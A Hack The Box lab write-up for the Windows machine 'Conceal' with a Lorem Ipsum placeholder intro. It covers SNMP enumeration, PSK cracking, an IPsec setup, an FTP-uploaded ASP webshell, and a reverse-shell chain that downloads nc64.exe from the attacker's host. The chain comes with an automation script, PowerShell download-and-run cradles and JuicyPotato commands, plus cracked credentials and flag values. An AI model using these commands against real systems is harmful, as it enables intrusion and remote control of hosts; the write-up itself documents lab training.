---
layout: single
title: Conceal - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-03-24
classes: wide
header:
  teaser: /assets/images/htb-writeup-conceal/conceal_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-conceal/conceal_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. Normal nmap scans finds nothing, even flag -p- doesn't find anything. Instead we go for UDP;

[root:/git/htb/conceal]# nmap -sU -sV --version-intensity 0 -F -n 10.10.10.116
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
500/udp open  isakmp?
Service Info: Host: Conceal


2. With SNMP found, we can try to enumerate by guessing the community string is set to 'public', using snmp-check.

[root:/git/htb/conceal]# snmp-check 10.10.10.116 -p 161 -c public                                                                 (master✱)
  snmp-check v1.9 - SNMP enumerator

  [+] Try to connect to 10.10.10.116:161 using SNMPv1 and community 'public'
    Host IP address               : 10.10.10.116
    Hostname                      : Conceal
    Description                   : Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
    Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
    Location                      : -
    Uptime snmp                   : 02:56:40.59
    Uptime system                 : 02:56:27.05
    System date                   : 2021-3-23 12:37:35.9
    Domain                        : WORKGROUP

  [*] User accounts:
    Guest
    Destitute
    Administrator
    DefaultAccount

  [*] TCP connections and listening ports:
    Local address         Local port            Remote address        Remote port           State
    0.0.0.0               21                    0.0.0.0               0                     listen
    0.0.0.0               80                    0.0.0.0               0                     listen
    0.0.0.0               135                   0.0.0.0               0                     listen
    0.0.0.0               445                   0.0.0.0               0                     listen
    0.0.0.0               49664                 0.0.0.0               0                     listen
    0.0.0.0               49665                 0.0.0.0               0                     listen
    0.0.0.0               49666                 0.0.0.0               0                     listen
    0.0.0.0               49667                 0.0.0.0               0                     listen
    0.0.0.0               49668                 0.0.0.0               0                     listen
    0.0.0.0               49669                 0.0.0.0               0                     listen
    0.0.0.0               49670                 0.0.0.0               0                     listen
    10.10.10.116          139                   0.0.0.0               0                     listen

  [*] Listening UDP ports:
    Local address         Local port
    0.0.0.0               123
    0.0.0.0               161
    0.0.0.0               500
    0.0.0.0               4500
    0.0.0.0               5050
    0.0.0.0               5353
    0.0.0.0               5355
    0.0.0.0               62345
    10.10.10.116          137
    10.10.10.116          138
    10.10.10.116          1900
    10.10.10.116          50998
    127.0.0.1             1900
    127.0.0.1             50999

  [*] Processes:
    Id                    Status                Name                  Path                  Parameters
    1                     running               System Idle Process
    4                     running               System
    60                    running               svchost.exe           C:\Windows\System32\  -k NetworkService
    68                    running               svchost.exe           C:\Windows\System32\  -k LocalSystemNetworkRestricted
    288                   running               smss.exe
    328                   running               svchost.exe           C:\Windows\system32\  -k LocalService
    380                   running               csrss.exe
    464                   running               wininit.exe
    472                   running               csrss.exe
    528                   running               winlogon.exe
    608                   running               services.exe
    616                   running               lsass.exe             C:\Windows\system32\
    668                   running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetwork
    704                   running               svchost.exe           C:\Windows\system32\  -k DcomLaunch
    732                   running               fontdrvhost.exe
    736                   running               fontdrvhost.exe
    828                   running               svchost.exe           C:\Windows\system32\  -k RPCSS
    920                   running               dwm.exe
    944                   running               svchost.exe           C:\Windows\system32\  -k netsvcs
    980                   running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
    1116                  running               vmacthlp.exe          C:\Program Files\VMware\VMware Tools\
    1212                  running               Memory Compression
    1348                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
    1420                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
    1436                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNetworkRestricted
    1504                  running               spoolsv.exe           C:\Windows\System32\
    1672                  running               svchost.exe           C:\Windows\system32\  -k appmodel
    1688                  running               LogonUI.exe                                 /flags:0x0 /state0:0xa3a9a055 /state1:0x41c64e6d
    1700                  running               svchost.exe           C:\Windows\system32\  -k apphost
    1720                  running               svchost.exe           C:\Windows\System32\  -k utcsvc
    1736                  running               svchost.exe           C:\Windows\system32\  -k ftpsvc
    1816                  running               SecurityHealthService.exe
    1828                  running               snmp.exe              C:\Windows\System32\
    1892                  running               svchost.exe           C:\Windows\system32\  -k iissvcs
    1928                  running               MsMpEng.exe
    1936                  running               VGAuthService.exe     C:\Program Files\VMware\VMware Tools\VMware VGAuth\
    1952                  running               vmtoolsd.exe          C:\Program Files\VMware\VMware Tools\
    2000                  running               ManagementAgentHost.exe  C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\
    2628                  running               svchost.exe           C:\Windows\system32\  -k NetworkServiceNetworkRestricted
    2768                  running               SearchIndexer.exe     C:\Windows\system32\  /Embedding
    2896                  running               WmiPrvSE.exe          C:\Windows\system32\wbem\
    3036                  running               dllhost.exe           C:\Windows\system32\  /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
    3204                  running               msdtc.exe             C:\Windows\System32\
    3528                  running               NisSrv.exe
    3696                  running               svchost.exe           C:\Windows\system32\  -k LocalSystemNetworkRestricted
    4076                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceAndNoImpersonation

We get a lot of interesting data;
- IKE VPN PSK: 9C8B1A372B1878851BE2C097031B6E43 (Dudecake1!)
- Usernames; Destitute, Administrator
- A lot of listening TCP- and UDP-ports.


3. The hash looks like md5, but trying to crack it with hashcat and wordlist rockyou.txt gives nothing.
Using hash-identifier we get the option of 'NTLM', and sure enough trying that gives us a password.

[root:/git/htb/conceal]# hash-identifier
  --- snip ---
   HASH: 9C8B1A372B1878851BE2C097031B6E43

  Possible Hashs:
  [+] MD5
  [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

  Least Possible Hashs:
  [+] RAdmin v2.x
  [+] NTLM


[root:/git/htb/conceal]# hashcat -a0 -m1000 '9C8B1A372B1878851BE2C097031B6E43' /usr/share/wordlists/rockyou.txt
  --- snip ---
  9c8b1a372b1878851be2c097031b6e43:Dudecake1!

Using ike-scan we can verify if they're running in aggressive or main mode. If aggressive mode, we can easily
brute force the group ID, and later a password hash to gain access.

Aggressive test:
[root:/git/htb/conceal]# ike-scan -M -A 10.10.10.116 --id=test --sport=5001                                                       (master✱)
  Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)

  Ending ike-scan 1.9.4: 1 hosts scanned in 2.438 seconds (0.41 hosts/sec).  0 returned handshake; 0 returned notify

Main test:
[root:/git/htb/conceal]# ike-scan -M 10.10.10.116 --sport=5001                                                          (master✱)
  Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
  10.10.10.116	Main Mode Handshake returned
  	HDR=(CKY-R=f2741f0361c9dbfa)
  	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
  	VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
  	VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
  	VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
  	VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
  	VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
  	VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)

  Ending ike-scan 1.9.4: 1 hosts scanned in 0.064 seconds (15.72 hosts/sec).  1 returned handshake; 0 returned notify

However they are running main mode, making it all that much harder.


4. With the information we have gathered, configure strongswan to setup our IPSec connection.

Edit '/etc/ipsec.secrets' and add the PSK at the bottom;
[root:/git/htb/conceal]# cat /etc/ipsec.secrets                                                                                   (master✱)
  --- snip ---
  10.10.10.116 : PSK "Dudecake1!"

Setup a new connection in '/etc/ipsec.conf';
[root:/git/htb/conceal]# cat /etc/ipsec.conf                                                                                      (master✱)
  --- snip ---
  conn Conceal
  	type=transport
  	auto=start
  	keyexchange=ikev1
  	authby=psk
  	right=10.10.10.116
  	ike=3des-sha1-modp1024
  	esp=3des-sha1
  	rightprotoport=tcp
    leftprotoport=tcp

[root:/git/htb/conceal]# ipsec start                                                                                              (master✱)
  Starting strongSwan 5.9.1 IPsec [starter]...
[root:/git/htb/conceal]# ipsec status                                                                                             (master✱)
  Security Associations (1 up, 0 connecting):
       Conceal[1]: ESTABLISHED 4 seconds ago, 10.10.14.11[10.10.14.11]...10.10.10.116[10.10.10.116]
       Conceal{1}:  INSTALLED, TRANSPORT, reqid 1, ESP SPIs: cddc16ac_i 19a4e0d0_o
       Conceal{1}:   10.10.14.11/32 === 10.10.10.116/32[tcp]

NOTE: Troubleshooting can be done by adding the --nofork flag, ex. 'ipsec start --nofork'


5. Now when connected, we can scan the device and get a satisfactory result. We found all open TCP ports earlier using
smnp-check, scan them again with nmap (flag -sT needed else everything shows as filtered).

[root:/opt/ikeforce]# nmap -sT -sVC 10.10.10.116 -p21,80,135,445,49664,49665,49666,49667,49668,49669,49670,139                     (master)
  PORT      STATE SERVICE       VERSION
  21/tcp    open  ftp           Microsoft ftpd
  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
  | ftp-syst:
  |_  SYST: Windows_NT
  80/tcp    open  http          Microsoft IIS httpd 10.0
  | http-methods:
  |_  Potentially risky methods: TRACE
  |_http-server-header: Microsoft-IIS/10.0
  |_http-title: IIS Windows
  135/tcp   open  msrpc         Microsoft Windows RPC
  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp   open  microsoft-ds?
  49664/tcp open  msrpc         Microsoft Windows RPC
  49665/tcp open  msrpc         Microsoft Windows RPC
  49666/tcp open  msrpc         Microsoft Windows RPC
  49667/tcp open  msrpc         Microsoft Windows RPC
  49668/tcp open  msrpc         Microsoft Windows RPC
  49669/tcp open  msrpc         Microsoft Windows RPC
  49670/tcp open  msrpc         Microsoft Windows RPC
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  Host script results:
  |_clock-skew: 6m23s
  | smb2-security-mode:
  |   2.02:
  |_    Message signing enabled but not required
  | smb2-time:
  |   date: 2021-03-23T15:23:09
  |_  start_date: 2021-03-23T09:41:08

DIRB:
  ---- Scanning URL: http://10.10.10.116/ ----
  ==> DIRECTORY: http://10.10.10.116/upload/


6. We got anonymous login to the FTP server, and can put files on the share. From dirb we found a 'upload' directory,
meaning we can probably upload a shell on the FTP-server, and trigger it through the URL.

Seems like we can upload most files, however file bigger then 1100 seem to get stuck in upload.
None of .aspx, .php, .py, .war, .exe, .jsp seem to work. I went with a minimal (size 1099) .asp webshell that worked.

From the webshell we can grab user.txt (called proof.txt in this box)

ftp> open 10.10.10.116
  Connected to 10.10.10.116.
  220 Microsoft FTP Service
  Name (10.10.10.116:root): anonymous
  331 Anonymous access allowed, send identity (e-mail name) as password.
  Password:
  230 User logged in.
  Remote system type is Windows_NT.
ftp> put webshell.asp

Browse: http://10.10.10.116/upload/webshell.asp

Enter: type C:\Users\Destitute\Desktop\proof.txt
or
URL: http://10.10.10.116/upload/webshell.asp?cmd=type+C%3A%5CUsers%5CDestitute%5CDesktop%5Cproof.txt

The server's local address:
10.10.10.116 6E9FDFE0DCB66E700FB9CB824AE5A6FF


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. To get a reverse shell has been very very annoying. I tried everything from one-liners to trigger powershell scripts
over a python3 hosted http.server, trigger executables over smb and more - but all failed, even though the victim
fetched the vulnerable file/scripts.

The solution was primal:
  a. Setup local python3 http.server in a directory containing nc64.exe
  b. Setup your nc listener
  c. Upload a webshell through the anonymous FTP
  d. Quickly create C:\tmp before webshell is deleted
  e. Quickly upload nc64.exe to C:\tmp
  f. Even faster execute a reverse connection from C:\tmp\nc64.exe before BOTH webshell and nc64.exe is deleted
  g. Grab shell and profit

WEBSHELL: mkdir C:\tmp

[root:/opt/shells/asp]# python3 -m http.server 8080
  Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
  10.10.10.116 - - [24/Mar/2021 12:23:48] "GET /nc64.exe HTTP/1.1" 200 -

WEBSHELL: powershell Invoke-WebRequest -Uri "http://10.10.14.11:8080/nc64.exe" -OutFile "C:\tmp\nc64.exe"
WEBSHELL: powershell -c "C:\tmp\nc64.exe 10.10.14.11 4488 -c cmd"

[root:/git/htb/conceal]# nc -lvnp 4488                                                                                            (master✱)
  listening on [any] 4488 ...
  connect to [10.10.14.11] from (UNKNOWN) [10.10.10.116] 49705
  Microsoft Windows [Version 10.0.15063]
  (c) 2017 Microsoft Corporation. All rights reserved.

  C:\Windows\SysWOW64\inetsrv>


This whole process can also be automated if one would want to make a script. For this I made a real quick and dirty
bash script, curl-rev.sh, as a poc.

[root:/git/htb/conceal]# cat curl-rev.sh                                                                                          (master✱)
  #!/bin/bash

  ### IMPORTANT! ###
  # Before you run the script, make sure to setup:
  # python -m http.server 8080 (in a folder where nc64.exe exists)
  # rlwrap nc -lvnp 4488

  # Upload Webshell
  curl --user anonymous:anonymous --upload-file /opt/shells/asp/webshell.asp ftp://conceal.htb/

  # Upload nc64.exe and executes reverse:
  # mkdir C:\tmp
  # powershell Invoke-WebRequest -Uri "http://10.10.14.11:8080/nc64.exe" -OutFile "C:\tmp\nc64.exe"
  # C:\tmp\nc64.exe 10.10.14.11 4488 -e cmd
  curl http://conceal.htb/upload/webshell.asp\?cmd\=mkdir%20C%3A%5Ctmp
  curl http://conceal.htb/upload/webshell.asp\?cmd\=powershell%20Invoke-WebRequest%20-Uri%20%22http%3A%2F%2F10.10.14.11%3A8080%2Fnc64.exe%22%20-OutFile%20%22C%3A%5Ctmp%5Cnc64.exe%22
  sleep 1
  curl http://conceal.htb/upload/webshell.asp\?cmd\=C%3A%5Ctmp%5Cnc64.exe%2010.10.14.11%204488%20-e%20cmd
  echo "done!"


2. Enumerate the box! Look a groups, privs, and see if there are any obviously suspicious files.

C:\tmp>whoami /all
  --- snip ---
  Everyone                             Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
  BUILTIN\Users                        Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
  NT AUTHORITY\BATCH                   Well-known group S-1-5-3                                                                                          Mandatory group, Enabled by default, Enabled group
  CONSOLE LOGON                        Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
  NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
  NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
  NT AUTHORITY\Local account           Well-known group S-1-5-113                                                                                        Mandatory group, Enabled by default, Enabled group
  BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568                                                                                     Mandatory group, Enabled by default, Enabled group
  LOCAL                                Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
  IIS APPPOOL\DefaultAppPool           Well-known group S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415                                    Mandatory group, Enabled by default, Enabled group
  NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                                                      Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-4028125388-2803578072-1053907958-341417128-2434011155-477421480-740873757-3973419746    Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-2745667521-2937320506-1424439867-4164262144-2333007343-2599685697-2993844191-2003921822 Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-1034403361-4122601751-838272506-684212390-1217345422-475792769-1698384238-1075311541    Mandatory group, Enabled by default, Enabled group
  Mandatory Label\High Mandatory Level Label            S-1-16-12288

  --- snip ---
  Privilege Name                Description                               State
  ============================= ========================================= ========
  SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
  SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
  SeShutdownPrivilege           Shut down the system                      Disabled
  SeAuditPrivilege              Generate security audits                  Disabled
  SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
  SeUndockPrivilege             Remove computer from docking station      Disabled
  SeImpersonatePrivilege        Impersonate a client after authentication Enabled
  SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
  SeTimeZonePrivilege           Change the time zone                      Disabled

Groups looks pretty normal, nothing really going on there.
We can see from the privs that we have 'SeImpersonatePrivilege', maybe we can use JuicyPotato?


3. Trying to execute JuicyPotato unfortunately locally and remotely triggers the AV;
C:\Users\Destitute\Documents> powershell Invoke-WebRequest -Uri "http://10.10.14.11:8080/JuicyPotato.exe" -OutFile jp.exe
C:\Users\Destitute\Documents> powershell -c "C:\Users\Destitute\Documents\jp.exe -l 1444 -p c:\tmp\nc64.exe -a "10.10.14.11 4499 -e cmd" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
  --- snip ---
  Program 'jp.exe' failed to run: Operation did not complete successfully because the file contains a virus or
  potentially unwanted software

We can't even setup a new reverse Powershell shell with Nishang's Invoke-PowerShellTcp without the AV complaining;
C:\Users\Destitute\Documents> powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.11:8080/Invoke-PowerShellTcp.ps1')
  --- snip ---
  This script contains malicious content and has been blocked by your antivirus software.


Seems like we need to look for another privesc.


4. Grab systeminfo and throw it to windows-exploit-suggester.

[root:/git/htb/conceal]# python /opt/windows-exploit-suggester.py --update                                                        (master✱)
[root:/git/htb/conceal]# python /opt/windows-exploit-suggester.py --database 2021-03-25-mssb.xls --systeminfo systeminfo.txt
  [*] initiating winsploit version 3.3...
  [*] database file detected as xls or xlsx based on extension
  [*] attempting to read from the systeminfo input file
  [+] systeminfo input file read successfully (ascii)
  [*] querying database file for potential vulnerabilities
  [*] comparing the 0 hotfix(es) against the 160 potential bulletins(s) with a database of 137 known exploits
  [*] there are now 160 remaining vulns
  [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
  [+] windows version identified as 'Windows 10 64-bit'
  [*]
  [E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
  [*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
  [*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
  [*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
  [*]
  [E] MS16-129: Cumulative Security Update for Microsoft Edge (3199057) - Critical
  [*]   https://www.exploit-db.com/exploits/40990/ -- Microsoft Edge (Windows 10) - 'chakra.dll' Info Leak / Type Confusion Remote Code Execution
  [*]   https://github.com/theori-io/chakra-2016-11
  [*]
  [E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
  [*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
  [*]
  [M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
  [*]   https://github.com/foxglovesec/RottenPotato
  [*]   https://github.com/Kevin-Robertson/Tater
  [*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
  [*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
  [*]
  [E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
  [*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
  [*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
  [*]
  [E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
  [*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
  [*]
  [E] MS16-056: Security Update for Windows Journal (3156761) - Critical
  [*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
  [*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
  [*]
  [E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
  [*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
  [*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
  [*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
  [*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
  [*]
  [M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
  [*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
  [*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
  [*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
  [*]
  [E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
  [*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
  [*]
  [E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
  [*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
  [*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
  [*]
  [E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
  [*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
  [*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
  [*]
  [E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
  [*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
  [*]
  [E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
  [*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
  [*]
  [E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
  [*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
  [*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
  [*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
  [*]
  [E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
  [*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
  [*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
  [*]
  [*] done


MS16-135:
C:\Users\Destitute\Documents> powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.11:8080/MS16-135.ps1')
  --- snip ---
  This script contains malicious content and has been blocked by your antivirus software.

C:\Users\Destitute\Documents> //10.10.14.11/share/41015.exe
  The request is not supported.


MS16-032:
Opens a new console, so only applicable when you have a RDP session.

MS16-016:
Opens a new console, so only applicable when you have a RDP session.


None of the above exploits seem to work. Out of frustration I went ahead an looked on a walkthrough, and sure enough
JuicyPotato was the way to root. Since we can't get it to work, here's the free root.txt:

5737DD2EDC29B5B219BC43E60866BE08


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

SNMP Enum:
  https://book.hacktricks.xyz/pentesting/pentesting-snmp#enumerating-snmp

IKE Enum:
  https://book.hacktricks.xyz/pentesting/ipsec-ike-vpn-pentesting

Strongswan:
  https://wiki.strongswan.org/projects/strongswan/wiki/ConnSection
  https://blog.ruanbekker.com/blog/2018/02/11/setup-a-site-to-site-ipsec-vpn-with-strongswan-and-preshared-key-authentication/

ASP Webshell:
  https://github.com/tennc/webshell/blob/master/asp/webshell.asp

Powershell Reverse:
  https://github.com/samratashok/nishang/tree/master/Shells

JuicyPotato CLSID:
  http://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise/
